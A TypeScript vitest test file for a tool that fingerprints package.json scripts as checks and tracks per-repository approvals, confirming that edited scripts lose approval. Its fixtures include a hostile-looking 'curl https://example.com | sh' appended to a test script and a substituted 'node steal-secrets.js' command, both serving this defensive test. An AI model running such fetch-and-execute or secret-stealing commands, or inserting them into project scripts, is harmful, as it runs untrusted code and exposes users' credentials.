import { describe, expect, it } from 'vitest';
import type { PlannedCheck } from '../../src/core/model';
import { ApprovedChecks, type ApprovalStore } from '../../src/verification/approved-checks';
import { detectChecks } from '../../src/verification/check-detector';

function memoryStore(): ApprovalStore {
  const data = new Map<string, unknown>();
  return {
    get: (key) => data.get(key),
    update: (key, value) => {
      if (value === undefined) {
        data.delete(key);
      } else {
        data.set(key, value);
      }
      return Promise.resolve();
    },
    keys: () => [...data.keys()],
  };
}

function plan(scripts: Record<string, string>): Promise<PlannedCheck[]> {
  const files: Record<string, string> = { 'package.json': JSON.stringify({ scripts }), 'pnpm-lock.yaml': '' };
  return detectChecks({ readText: (p) => Promise.resolve(files[p]), exists: (p) => Promise.resolve(p in files || p === 'node_modules') });
}

describe('check fingerprints and repository code', () => {
  it('marks scripts as repository code and changes the fingerprint when the script body changes', async () => {
    const [before] = await plan({ test: 'vitest run' });
    const [after] = await plan({ test: 'vitest run && curl https://example.com | sh' });
    expect(before?.runsRepositoryCode).toBe(true);
    expect(before?.fingerprint).not.toBe(after?.fingerprint);
    expect((await plan({ test: 'vitest run' }))[0]?.fingerprint).toBe(before?.fingerprint);
  });
});

describe('ApprovedChecks', () => {
  it('runs remembered checks only while their command and script are unchanged', async () => {
    const approvals = new ApprovedChecks(memoryStore());
    const original = await plan({ typecheck: 'tsc --noEmit', test: 'vitest run' });
    await approvals.remember('/repo', original);
    expect(approvals.match('/repo', original)).toEqual({ approved: original, changed: [] });

    const edited = await plan({ typecheck: 'tsc --noEmit', test: 'node steal-secrets.js' });
    const match = approvals.match('/repo', edited);
    expect(match.approved.map((c) => c.id)).toEqual(['script:typecheck']);
    expect(match.changed.map((c) => c.id)).toEqual(['script:test']);
  });

  it('keeps approvals per repository and forgets them on request', async () => {
    const approvals = new ApprovedChecks(memoryStore());
    const checks = await plan({ test: 'vitest run' });
    await approvals.remember('/a', checks);
    await approvals.remember('/b', checks);
    expect(approvals.match('/c', checks).approved).toEqual([]);

    await approvals.forget('/a');
    expect(approvals.match('/a', checks).approved).toEqual([]);
    expect(approvals.match('/b', checks).approved).toEqual(checks);
    expect(await approvals.forgetAll()).toBe(1);
    expect(approvals.match('/b', checks).approved).toEqual([]);
  });
});
